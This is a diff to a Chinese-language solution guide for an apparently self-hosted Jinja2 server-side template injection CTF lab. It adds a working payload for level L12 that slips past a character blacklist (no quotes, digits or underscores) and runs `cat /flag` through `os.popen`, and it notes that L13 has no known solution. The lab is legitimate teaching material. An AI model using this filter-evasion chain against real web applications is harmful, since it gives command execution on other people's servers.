@@ -36,8 +36,8 @@
 | 8 | L9 禁止数字 | `0`–`9` | `true\|int`、`\|length` 凑整数 |
 | 9 | L10 前缀置空 | 载荷前拼 `{% set config=None%}{% set self=None%}` | 换未置空的全局入口 |
 | 10 | L11 组合过滤 | `' " + . [ ]` 与 `request` | `\|join` 替代 `+`，绕过取值通道 |
-| 11 | L12 强字符集 | 再加 `_`、数字、`\` | CTF 硬关 |
-| 12 | L13 扩展关键字 | 符号 + `request/class/init/arg/config/app/self` | CTF 硬关：`init` 会拦掉 `__init__`，逐个子串过一遍 |
+| 11 | L12 强字符集 | 再加 `_`、数字、`\` | 本关没禁 `request` 与数字：属性名全从 query 带入，`dict(kw=true)\|first` 无引号造短串 |
+| 12 | L13 扩展关键字 | 符号 + `request/class/init/arg/config/app/self` | 作者挑战关（无已知解）：`attr` 在表内 ⇒ 全部属性访问原语不可用，见题面说明 |
 
 ## 参考解
 
@@ -161,19 +161,34 @@ curl -s -X POST 'localhost:8092/api/render?a=__globals__&b=os&c=popen&d=cat /fla
 `+` 被禁 → 用 `|join`；`.` 被禁 → `|attr`；`[]` 被禁 → 用过滤器；
 `request` 被禁 → 换其它取值通道（`session`、`config`、`url_for` 等）。
 
-### L12（id 11）、L13（id 12）硬关
+### L12（id 11）强字符集 ✅
 
-这两关是**刻意设计**的：符号与关键字表同时收紧到几乎无法写出一条完整链。
-建议的练习方式：
+禁 `_ . 0-9 \ ' " [ ]`。对比 L11 的黑名单找差异：**`request` 没有被禁**。
+于是属性名全部从 query 带入，载荷里一个 `_`、一个引号、一个数字都不出现：
 
-1. 开**上帝模式**，提交一个小 payload，观察 `template_after_waf`（过滤后的模板）
-   与 `exception_type`（是 WAF 拦了，还是载荷本身语法错了）。
-2. 逐个字符确认「我最先失去的是哪一种表达能力」——字符串？属性名？整数？
-3. 再考虑用剩下的语法面重建它。
+```jinja2
+{%set r=request|attr(dict(args=true)|first)|attr(dict(get=true)|first)%}
+{{lipsum|attr(r(dict(a=true)|first))|attr(r(dict(b=true)|first))(r(dict(c=true)|first))
+|attr(r(dict(d=true)|first))(r(dict(e=true)|first))|attr(r(dict(f=true)|first))()}}
+```
 
-如果你希望 L12/L13 在默认 Python 3.11 下**必有短解**，需要放宽对应的
-`WafSpec`（改 `shared/ssti_core/levels/jinja.py` 里那一关的规则）。改完请
-同步更新本文件的表格。
+query：`a=__globals__&b=get&c=os&d=popen&e=cat /flag&f=read`。
+
+要点：`dict(关键字=true)|first` 在**无引号、无数字**的条件下造出短字符串
+（`true` 是 Jinja 字面量，不含数字）；`r` 是绑定好的 `request.args.get`，
+六个属性名/命令全部来自请求。已由 `tests/audit_solvability.py` 在容器内实测拿到 flag。
+
+### L13（id 12）扩展关键字 —— 作者挑战关（无已知解）
+
+在 L12 之上再禁 `request` 与若干关键字。`attr` 在子串表里 ⇒
+`|attr`、`getattr`、`map(attribute=…)`、`selectattr`… 全部写不出来；
+加上点号与方括号被禁，Jinja 的**全部属性访问原语**在本关不可用，
+而已知的每条 gadget 链都需要至少一次属性访问。
+
+这是刻意保留的难度上限（题面已如实标注）。练习方式：
+开**上帝模式**确认 `template_after_waf`，理解「为什么每条路都断在属性访问上」。
+若教学场次需要人人可过，按 `docs/SOLVABILITY.md` §2.5 的表放宽一条约束即可
+（允许 `request` / 允许 `attr` 子串 / 允许 `.`，任选其一）。
 
 ## 运行
 
